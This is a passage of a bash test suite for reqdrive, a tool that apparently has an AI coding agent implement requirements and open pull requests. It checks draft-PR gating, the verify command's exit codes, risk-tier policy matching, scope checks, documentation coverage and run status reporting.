  jq -e '.stories | has("total") and has("completed") and has("failed") and has("remaining")' "$s" > /dev/null
  jq -e '.iterations | has("run") and has("max")' "$s" > /dev/null
  jq -e '.iterations.max != null' "$s" > /dev/null
  jq -e 'has("prd_present")' "$s" > /dev/null
  jq -e '.tests | has("passed") and has("failed") and has("skipped")' "$s" > /dev/null
  jq -e '.commits | has("verified") and has("missing")' "$s" > /dev/null
)
test_result "verification: summary keeps its full shape" $?

echo ""
echo "--- Draft Gate ---"

# Test: fail-open A — no testCommand means no evidence, so draft
(
  set -e
  source "$REQDRIVE_ROOT/tests/lib/pipeline-harness.sh"
  ph_setup "$TEST_TEMP/dg-a"
  ph_fake_claude full
  ph_fake_gh
  ph_run REQ-01 > /dev/null
  ph_gh_args | grep -q "pr create"
  ph_gh_args | grep "pr create" | grep -q -- "--draft"
)
test_result "draft gate: no testCommand forces draft" $?

# Test: planning failure — no prd.json after exhausting retries hard-aborts, no PR
(
  set -e
  source "$REQDRIVE_ROOT/tests/lib/pipeline-harness.sh"
  ph_setup "$TEST_TEMP/dg-b"
  ph_fake_claude noprd
  ph_fake_gh
  rc=$(ph_run REQ-01)
  [ "$rc" = "5" ]
  if ph_gh_args | grep -q "pr create"; then
    echo "unexpected PR" >&2
    exit 1
  fi
)
test_result "draft gate: planning failure aborts with no PR" $?

# Test: fail-open C — stories omitting 'passes' are not complete, so draft
(
  set -e
  source "$REQDRIVE_ROOT/tests/lib/pipeline-harness.sh"
  ph_setup "$TEST_TEMP/dg-c"
  ph_fake_claude nopasses
  ph_fake_gh
  ph_run REQ-01 > /dev/null
  ph_gh_args | grep "pr create" | grep -q -- "--draft"
)
test_result "draft gate: stories omitting passes force draft" $?

# Test: positive control — full evidence produces a non-draft PR
(
  set -e
  source "$REQDRIVE_ROOT/tests/lib/pipeline-harness.sh"
  ph_setup "$TEST_TEMP/dg-ok"
  jq '.testCommand = "true"' "$PH_ROOT/reqdrive.json" > "$PH_ROOT/r.tmp"
  mv "$PH_ROOT/r.tmp" "$PH_ROOT/reqdrive.json"
  git -C "$PH_ROOT" add -A && git -C "$PH_ROOT" commit -q -m "chore: enable testCommand"
  ph_fake_claude full
  ph_fake_gh
  ph_run REQ-01 > /dev/null
  ph_gh_args | grep -q "pr create"
  ! ph_gh_args | grep "pr create" | grep -q -- "--draft"
)
test_result "draft gate: full evidence produces non-draft PR" $?

# Test: preflight warns when no testCommand is configured
(
  set -e
  source "$REQDRIVE_ROOT/lib/errors.sh"
  source "$REQDRIVE_ROOT/lib/preflight.sh"
  out=$(REQDRIVE_TEST_COMMAND="" check_test_command_configured 2>&1) || true
  echo "$out" | grep -q "all PRs will be created as drafts"
)
test_result "preflight: warns when no testCommand is configured" $?

# Test: preflight is silent when a testCommand exists
(
  set -e
  source "$REQDRIVE_ROOT/lib/errors.sh"
  source "$REQDRIVE_ROOT/lib/preflight.sh"
  out=$(REQDRIVE_TEST_COMMAND="npm test" check_test_command_configured 2>&1) || true
  [ -z "$out" ]
)
test_result "preflight: silent when testCommand is configured" $?

# Test: PR body distinguishes 'not configured' from 'tests failed'
(
  set -e
  source "$REQDRIVE_ROOT/tests/lib/pipeline-harness.sh"
  ph_setup "$TEST_TEMP/dg-reason"
  ph_fake_claude full
  ph_fake_gh
  ph_run REQ-01 > /dev/null
  grep -q "no test command configured" "$PH_ROOT/gh-args.log"
)
test_result "pr: body states why verification was not run" $?

echo ""
echo "--- Verify Command ---"

# Test: verify re-runs verification and preserves the evidence trail
(
  set -e
  source "$REQDRIVE_ROOT/tests/lib/pipeline-harness.sh"
  ph_setup "$TEST_TEMP/v-merge"
  jq '.testCommand = "true"' "$PH_ROOT/reqdrive.json" > "$PH_ROOT/r.t" && mv "$PH_ROOT/r.t" "$PH_ROOT/reqdrive.json"
  git -C "$PH_ROOT" add -A && git -C "$PH_ROOT" commit -q -m "chore: testCommand"
  ph_fake_claude full
  ph_fake_gh
  ph_run REQ-01 > /dev/null
  # A completed run's process is dead. In the harness run.json's pid is $$
  # (the test runner, still alive), so mark it dead to reflect reality and
  # let verify past its concurrency guard.
  rj="$PH_ROOT/.reqdrive/runs/req-01/run.json"
  jq '.pid = 999999' "$rj" > "$rj.t" && mv "$rj.t" "$rj"
  s="$PH_ROOT/.reqdrive/runs/req-01/verification-summary.json"
  before_iters=$(jq '.iterations.run' "$s")
  before_commits=$(jq '.commits.verified' "$s")
  (cd "$PH_ROOT" && PATH="$PH_BIN:$PATH" "$REQDRIVE_ROOT/bin/reqdrive" verify REQ-01)
  [ "$(jq '.iterations.run' "$s")" = "$before_iters" ]
  [ "$(jq '.commits.verified' "$s")" = "$before_commits" ]
)
test_result "verify: merge mode preserves the evidence trail" $?

# Test: verify exits 9 when the test command fails
(
  set -e
  source "$REQDRIVE_ROOT/tests/lib/pipeline-harness.sh"
  ph_setup "$TEST_TEMP/v-fail"
  jq '.testCommand = "true"' "$PH_ROOT/reqdrive.json" > "$PH_ROOT/r.t" && mv "$PH_ROOT/r.t" "$PH_ROOT/reqdrive.json"
  git -C "$PH_ROOT" add -A && git -C "$PH_ROOT" commit -q -m "chore: testCommand"
  ph_fake_claude full
  ph_fake_gh
  ph_run REQ-01 > /dev/null
  jq '.testCommand = "false"' "$PH_ROOT/reqdrive.json" > "$PH_ROOT/r.t" && mv "$PH_ROOT/r.t" "$PH_ROOT/reqdrive.json"
  # A completed run's process is dead; the harness leaves run.json's pid as
  # $$ (the live test runner), so mark it dead to reflect reality.
  rj="$PH_ROOT/.reqdrive/runs/req-01/run.json"
  jq '.pid = 999999' "$rj" > "$rj.t" && mv "$rj.t" "$rj"
  rc=0
  (cd "$PH_ROOT" && PATH="$PH_BIN:$PATH" "$REQDRIVE_ROOT/bin/reqdrive" verify REQ-01) || rc=$?
  [ "$rc" -eq 9 ]
)
test_result "verify: exits 9 when verification fails" $?

# Test: verify exits 3 for an unknown REQ-ID
(
  set -e
  source "$REQDRIVE_ROOT/tests/lib/pipeline-harness.sh"
  ph_setup "$TEST_TEMP/v-unknown"
  rc=0
  out=$(cd "$PH_ROOT" && "$REQDRIVE_ROOT/bin/reqdrive" verify REQ-99 2>&1) || rc=$?
  [ "$rc" -eq 3 ]
  echo "$out" | grep -qi "req-99"
)
test_result "verify: exits 3 for an unknown REQ-ID" $?

# Test: verify refuses while the run's PID is alive
(
  set -e
  source "$REQDRIVE_ROOT/tests/lib/pipeline-harness.sh"
  ph_setup "$TEST_TEMP/v-live"
  run_dir="$PH_ROOT/.reqdrive/runs/req-01"
  mkdir -p "$run_dir"
  echo '{"version":"0.3.0"}' > "$run_dir/verification-summary.json"
  cat > "$run_dir/run.json" <<EOF
{"version":"0.3.0","req_id":"REQ-01","status":"running","pid":$$,"iteration":1}
EOF
  rc=0
  (cd "$PH_ROOT" && "$REQDRIVE_ROOT/bin/reqdrive" verify REQ-01 >/dev/null 2>&1) || rc=$?
  [ "$rc" -eq 10 ]
)
test_result "verify: exits 10 while the run PID is alive" $?

# Test: verify refuses a run with no checkpoint when no --ref given
# (without this, an empty-stories/maxIterations=0 run never writes
# checkpoint.json, and verify silently skipped the branch check entirely.)
(
  set -e
  source "$REQDRIVE_ROOT/tests/lib/pipeline-harness.sh"
  ph_setup "$TEST_TEMP/v-nockpt"
  run_dir="$PH_ROOT/.reqdrive/runs/req-01"
  mkdir -p "$run_dir"
  echo '{"version":"0.3.0"}' > "$run_dir/verification-summary.json"
  cat > "$run_dir/run.json" <<EOF
{"version":"0.3.0","req_id":"REQ-01","status":"completed","pid":999999,"iteration":1}
EOF
  rc=0
  (cd "$PH_ROOT" && "$REQDRIVE_ROOT/bin/reqdrive" verify REQ-01 >/dev/null 2>&1) || rc=$?
  [ "$rc" -eq 3 ]
)
test_result "verify: refuses a run with no checkpoint when no --ref given" $?

# Test: verify exits 4 (not git's raw 1) when --ref names a nonexistent branch
(
  set -e
  source "$REQDRIVE_ROOT/tests/lib/pipeline-harness.sh"
  ph_setup "$TEST_TEMP/v-badref"
  run_dir="$PH_ROOT/.reqdrive/runs/req-01"
  mkdir -p "$run_dir"
  echo '{"version":"0.3.0"}' > "$run_dir/verification-summary.json"
  cat > "$run_dir/run.json" <<EOF
{"version":"0.3.0","req_id":"REQ-01","status":"completed","pid":999999,"iteration":1}
EOF
  rc=0
  (cd "$PH_ROOT" && "$REQDRIVE_ROOT/bin/reqdrive" verify REQ-01 --ref does-not-exist >/dev/null 2>&1) || rc=$?
  [ "$rc" -eq 4 ]
)
test_result "verify: exits 4 when --ref names a nonexistent branch" $?

# Test: new exit codes exist with messages
(
  set -e
  source "$REQDRIVE_ROOT/lib/errors.sh"
  [ "$EXIT_VERIFICATION_FAILED" -eq 9 ]
  [ "$EXIT_CONCURRENT_RUN" -eq 10 ]
  [ -n "$(get_exit_message 9)" ] && [ "$(get_exit_message 9)" != "Unknown error" ]
  [ -n "$(get_exit_message 10)" ] && [ "$(get_exit_message 10)" != "Unknown error" ]
)
test_result "errors: verification and concurrency codes are defined" $?

echo ""
echo "--- Policy Config ---"

# Test: a well-formed policy object validates
(
  set -e
  cd "$TEST_TEMP" && mkdir -p pol-ok && cd pol-ok
  cat > reqdrive.json <<'EOF'
{"version":"0.3.0","policy":{"riskTiers":{"high":["src/auth"],"low":["docs"]},"scopeCheck":"warn"}}
EOF
  "$REQDRIVE_ROOT/bin/reqdrive" validate > /dev/null 2>&1
)
test_result "policy: a well-formed policy object validates" $?

# Test: an invalid scopeCheck value is rejected
(
  set -e
  cd "$TEST_TEMP" && mkdir -p pol-bad && cd pol-bad
  cat > reqdrive.json <<'EOF'
{"version":"0.3.0","policy":{"scopeCheck":"maybe"}}
EOF
  rc=0
  out=$("$REQDRIVE_ROOT/bin/reqdrive" validate 2>&1) || rc=$?
  [ "$rc" -eq 3 ]
  echo "$out" | grep -q "scopeCheck"
)
test_result "policy: rejects an invalid scopeCheck value" $?

# Test: riskTiers must map tier names to arrays
(
  set -e
  cd "$TEST_TEMP" && mkdir -p pol-tiers && cd pol-tiers
  cat > reqdrive.json <<'EOF'
{"version":"0.3.0","policy":{"riskTiers":{"high":"src/auth"}}}
EOF
  rc=0
  out=$("$REQDRIVE_ROOT/bin/reqdrive" validate 2>&1) || rc=$?
  [ "$rc" -eq 3 ]
  echo "$out" | grep -q "riskTiers"
)
test_result "policy: rejects a non-array risk tier" $?

# Test: scopeCheck defaults to warn when policy is absent
(
  set -e
  cd "$TEST_TEMP" && mkdir -p pol-default && cd pol-default
  echo '{"version":"0.3.0"}' > reqdrive.json
  source "$REQDRIVE_ROOT/lib/errors.sh"
  source "$REQDRIVE_ROOT/lib/schema.sh"
  source "$REQDRIVE_ROOT/lib/config.sh"
  reqdrive_load_config
  [ "$REQDRIVE_POLICY_SCOPE_CHECK" = "warn" ]
  [ "$REQDRIVE_POLICY_JSON" = "{}" ]
)
test_result "policy: scopeCheck defaults to warn when absent" $?

echo ""
echo "--- Doc Coverage ---"

# Test: every dispatch command appears in README
(
  set -e
  cmds=$(awk '/^case "\$\{1:-\}" in$/,/^esac$/' "$REQDRIVE_ROOT/bin/reqdrive" \
    | sed 's/^[[:space:]]*//' \
    | grep -E '^[a-z][a-z-]*\)$' \
    | tr -d ')')
  [ -n "$cmds" ]
  missing=""
  for c in $cmds; do
    grep -q "reqdrive $c" "$REQDRIVE_ROOT/README.md" || missing="$missing $c"
  done
  [ -z "$missing" ] || { echo "undocumented commands:$missing" >&2; false; }
)
test_result "docs: every CLI command is documented in README" $?

# Test: every config-backed REQDRIVE_* variable is documented in README
(
  set -e
  # DOC_EXEMPT — derived at runtime, not settable in reqdrive.json:
  #   REQDRIVE_MANIFEST         resolved path of the found manifest
  #   REQDRIVE_PROJECT_ROOT     parent directory of the manifest
  #   REQDRIVE_ROOT             reqdrive's own install directory
  #   REQDRIVE_POLICY_JSON      derived from the single documented `policy` field, not a field itself
  #   REQDRIVE_POLICY_SCOPE_CHECK  derived from the single documented `policy` field, not a field itself
  exempt="REQDRIVE_MANIFEST REQDRIVE_PROJECT_ROOT REQDRIVE_ROOT REQDRIVE_POLICY_JSON REQDRIVE_POLICY_SCOPE_CHECK"
  vars=$(grep -oE 'REQDRIVE_[A-Z_]+' "$REQDRIVE_ROOT/lib/config.sh" | sort -u)
  [ -n "$vars" ]
  missing=""
  for v in $vars; do
    case " $exempt " in *" $v "*) continue ;; esac
    # REQDRIVE_MAX_STORY_RETRIES -> maxStoryRetries
    field=$(printf '%s\n' "${v#REQDRIVE_}" | awk -F_ '{
      out = tolower($1)
      for (i = 2; i <= NF; i++) out = out toupper(substr($i,1,1)) tolower(substr($i,2))
      print out
    }')
    grep -q "$field" "$REQDRIVE_ROOT/README.md" || missing="$missing $field"
  done
  [ -z "$missing" ] || { echo "undocumented config fields:$missing" >&2; false; }
)
test_result "docs: every config field is documented in README" $?

# Test: every accepted CLI flag is documented in README
(
  set -e
  # Whole-file scan for flag case-labels (not a hardcoded line window) so
  # this test reddens if a --flag) case moves outside any fixed range.
  flags=$(grep -E '^[[:space:]]*(-[a-z]\|)?--[a-z-]+(\|--[a-z-]+)*\)$' "$REQDRIVE_ROOT/bin/reqdrive" \
    | sed 's/^[[:space:]]*//' \
    | tr -d ')' | tr '|' '\n' \
    | grep -E '^--' | sort -u)
  [ -n "$flags" ]
  missing=""
  for f in $flags; do
    grep -q -- "$f" "$REQDRIVE_ROOT/README.md" || missing="$missing $f"
  done
  [ -z "$missing" ] || { echo "undocumented flags:$missing" >&2; false; }
)
test_result "docs: every CLI flag is documented in README" $?

echo ""
echo "--- Harness Safety ---"

# Test: suite refuses to run when mktemp fails
(
  set -e
  set -e
  fake_bin="$TEST_TEMP/fakebin"
  mkdir -p "$fake_bin"
  cat > "$fake_bin/mktemp" <<'MKEOF'
#!/usr/bin/env bash
exit 1
MKEOF
  chmod +x "$fake_bin/mktemp"
  out=$(PATH="$fake_bin:$PATH" bash "$REQDRIVE_ROOT/tests/simple-test.sh" 2>&1) && rc=0 || rc=$?
  [ "$rc" -ne 0 ]
  echo "$out" | grep -q "FATAL: mktemp failed"
)
test_result "harness: aborts when mktemp fails" $?

echo ""
echo "--- Launch Lifecycle ---"

# Test: status reports a completed run with its exit code and PR URL
(
  set -e
  mkdir -p "$TEST_TEMP/ll-completed/docs/requirements"
  cat > "$TEST_TEMP/ll-completed/reqdrive.json" <<'EOF'
{"version":"0.3.0","requirementsDir":"docs/requirements"}
EOF
  run_dir="$TEST_TEMP/ll-completed/.reqdrive/runs/req-01"
  mkdir -p "$run_dir"
  cat > "$run_dir/run.json" <<'EOF'
{"version":"0.3.0","req_id":"REQ-01","status":"completed","pid":999999,
 "iteration":2,"exit_code":0,"pr_url":"https://github.com/test/repo/pull/7",
 "started":"2026-07-23T10:00:00Z","updated":"2026-07-23T10:05:00Z"}
EOF
  out=$(cd "$TEST_TEMP/ll-completed" && "$REQDRIVE_ROOT/bin/reqdrive" status REQ-01 2>&1) || true
  echo "$out" | grep -q "completed"
  echo "$out" | grep -q "pull/7"
)
test_result "launch: status reports a completed run with its PR URL" $?

# Test: status reports a crashed run when the PID is gone
# PID 999999 is above Linux's default pid_max, so it is reliably dead
# without spawning or killing a real process.
(
  set -e
  mkdir -p "$TEST_TEMP/ll-crashed/docs/requirements"
  cat > "$TEST_TEMP/ll-crashed/reqdrive.json" <<'EOF'
{"version":"0.3.0","requirementsDir":"docs/requirements"}
EOF
  run_dir="$TEST_TEMP/ll-crashed/.reqdrive/runs/req-01"
  mkdir -p "$run_dir"
  cat > "$run_dir/run.json" <<'EOF'
{"version":"0.3.0","req_id":"REQ-01","status":"running","pid":999999,
 "iteration":1,"started":"2026-07-23T10:00:00Z","updated":"2026-07-23T10:01:00Z"}
EOF
  out=$(cd "$TEST_TEMP/ll-crashed" && "$REQDRIVE_ROOT/bin/reqdrive" status REQ-01 2>&1) || true
  echo "$out" | grep -qi "crashed"
)
test_result "launch: status reports a crashed run when the PID is gone" $?

# Test: completion hook passes REQ_ID, STATUS and EXIT_CODE to the hook command
(
  set -e
  export REQDRIVE_ROOT
  source "$REQDRIVE_ROOT/lib/errors.sh"
  source "$REQDRIVE_ROOT/lib/sanitize.sh"
  source "$REQDRIVE_ROOT/lib/preflight.sh"
  source "$REQDRIVE_ROOT/lib/schema.sh"
  source "$REQDRIVE_ROOT/lib/run.sh" 2>/dev/null || true

  export REQDRIVE_COMPLETION_HOOK="echo REQ_ID=\$REQ_ID STATUS=\$STATUS EXIT_CODE=\$EXIT_CODE > $TEST_TEMP/ll-hook-out.txt"
  run_completion_hook "REQ-01" "failed" "" "reqdrive/req-01" "5" 2>/dev/null
  grep -q "REQ_ID=REQ-01" "$TEST_TEMP/ll-hook-out.txt"
  grep -q "STATUS=failed" "$TEST_TEMP/ll-hook-out.txt"
  grep -q "EXIT_CODE=5" "$TEST_TEMP/ll-hook-out.txt"
)
test_result "launch: completion hook passes REQ_ID, STATUS and EXIT_CODE" $?

# Test: re-launch is permitted after the previous run completed (status != "running")
(
  set -e
  proj="$TEST_TEMP/ll-relaunch"
  mkdir -p "$proj/docs/requirements"
  cat > "$proj/reqdrive.json" <<'EOF'
{"version":"0.3.0","requirementsDir":"docs/requirements"}
EOF
  cat > "$proj/docs/requirements/REQ-01-demo.md" <<'EOF'
# REQ-01: Demo
EOF
  run_dir="$proj/.reqdrive/runs/req-01"
  mkdir -p "$run_dir"
  cat > "$run_dir/run.json" <<'EOF'
{"version":"0.3.0","req_id":"REQ-01","status":"completed","pid":999999,
 "iteration":2,"exit_code":0,"pr_url":"https://github.com/test/repo/pull/7",
 "started":"2026-07-23T10:00:00Z","updated":"2026-07-23T10:05:00Z"}
EOF
  # No git repo here: the backgrounded pipeline fails preflight almost
  # instantly, which is irrelevant to this assertion. cmd_launch's
  # synchronous output — printed before it ever backgrounds — is what
  # proves the duplicate-run guard was skipped because status != "running".
  out=$(cd "$proj" && "$REQDRIVE_ROOT/bin/reqdrive" launch REQ-01 2>&1)
  echo "$out" | grep -q "Launched REQ-01"
  ! echo "$out" | grep -qi "already running"
)
test_result "launch: re-launch is permitted after the previous run completed" $?

echo ""
echo "--- Policy Matcher ---"

# Test: matcher classifies paths by tier (nested descendant, tier dir itself, no match)
(
  set -e
  export REQDRIVE_POLICY_JSON='{"riskTiers":{"high":["src/auth"],"medium":["src/api"],"low":["docs"]}}'
  source "$REQDRIVE_ROOT/lib/policy.sh"
  [ "$(policy_tier_for_path 'src/auth/login.ts')" = "high" ]      # nested descendant
  [ "$(policy_tier_for_path 'src/auth')" = "high" ]                # the tier directory itself
  [ "$(policy_tier_for_path 'src/api/v1/users.ts')" = "medium" ]
  [ "$(policy_tier_for_path 'docs/README.md')" = "low" ]
  [ "$(policy_tier_for_path 'src/util/math.ts')" = "none" ]        # no match
)
test_result "policy: matcher classifies paths by tier" $?

# Test: a sibling that merely shares the prefix must NOT match (directory-boundary check)
(
  set -e
  export REQDRIVE_POLICY_JSON='{"riskTiers":{"high":["src/auth"]}}'
  source "$REQDRIVE_ROOT/lib/policy.sh"
  [ "$(policy_tier_for_path 'src/auth.sh')" = "none" ]
  [ "$(policy_tier_for_path 'src/authorization/x.ts')" = "none" ]
)
test_result "policy: a prefix-sharing sibling does not match" $?

# Test: a trailing-slash pattern is normalized (src/auth/ behaves as src/auth)
(
  set -e
  export REQDRIVE_POLICY_JSON='{"riskTiers":{"high":["src/auth/"]}}'
  source "$REQDRIVE_ROOT/lib/policy.sh"
  [ "$(policy_tier_for_path 'src/auth/login.ts')" = "high" ]
  [ "$(policy_tier_for_path 'src/auth')" = "high" ]
  [ "$(policy_tier_for_path 'src/auth.sh')" = "none" ]
)
test_result "policy: a trailing-slash pattern is normalized" $?

# Test: highest tier wins when a path matches two
(
  set -e
  # src/auth/keys is in both high and low; highest must win.
  export REQDRIVE_POLICY_JSON='{"riskTiers":{"high":["src/auth"],"low":["src/auth/keys"]}}'
  source "$REQDRIVE_ROOT/lib/policy.sh"
  [ "$(policy_tier_for_path 'src/auth/keys/rsa.pem')" = "high" ]
)
test_result "policy: highest tier wins when a path matches two" $?

# Test: no riskTiers means every path is untiered
(
  set -e
  export REQDRIVE_POLICY_JSON='{}'
  source "$REQDRIVE_ROOT/lib/policy.sh"
  [ "$(policy_tier_for_path 'src/auth/login.ts')" = "none" ]
)
test_result "policy: no riskTiers means every path is untiered" $?

echo ""
echo "--- Scope Check ---"

# Test: warn mode records a finding and does not abort
(
  set -e
  source "$REQDRIVE_ROOT/tests/lib/pipeline-harness.sh"
  ph_setup "$TEST_TEMP/sc-warn"
  jq '.policy = {"riskTiers":{"high":["MARKER.txt"]},"scopeCheck":"warn"}' \
    "$PH_ROOT/reqdrive.json" > "$PH_ROOT/r.t" && mv "$PH_ROOT/r.t" "$PH_ROOT/reqdrive.json"
  git -C "$PH_ROOT" add -A && git -C "$PH_ROOT" commit -q -m "chore: policy"
  ph_fake_claude full
  ph_fake_gh
  rc=$(ph_run REQ-01)
  [ "$rc" = "0" ]
  grep -qi "high-risk" "$PH_ROOT/run.log"
)
test_result "scope: warn mode logs a finding and continues" $?

# Test: block mode aborts with EXIT_PREFLIGHT_FAILED
(
  set -e
  source "$REQDRIVE_ROOT/tests/lib/pipeline-harness.sh"
  ph_setup "$TEST_TEMP/sc-block"
  jq '.policy = {"riskTiers":{"high":["MARKER.txt"]},"scopeCheck":"block"}' \
    "$PH_ROOT/reqdrive.json" > "$PH_ROOT/r.t" && mv "$PH_ROOT/r.t" "$PH_ROOT/reqdrive.json"
  git -C "$PH_ROOT" add -A && git -C "$PH_ROOT" commit -q -m "chore: policy"
  ph_fake_claude full
  ph_fake_gh
  rc=$(ph_run REQ-01)
  [ "$rc" = "8" ]
)
test_result "scope: block mode aborts with EXIT_PREFLIGHT_FAILED" $?

# Test: no policy means no scope finding at all
(
  set -e
  source "$REQDRIVE_ROOT/tests/lib/pipeline-harness.sh"
  ph_setup "$TEST_TEMP/sc-none"
  ph_fake_claude full
  ph_fake_gh
  rc=$(ph_run REQ-01)
  [ "$rc" = "0" ]
  if grep -qi "high-risk" "$PH_ROOT/run.log"; then
    exit 1
  fi
)
test_result "scope: absent policy produces no findings" $?

echo ""
echo "========================================"
echo "  Results: $PASS passed, $FAIL failed, $SKIP skipped, $TOTAL total"
echo "========================================"

[ "$FAIL" -eq 0 ]
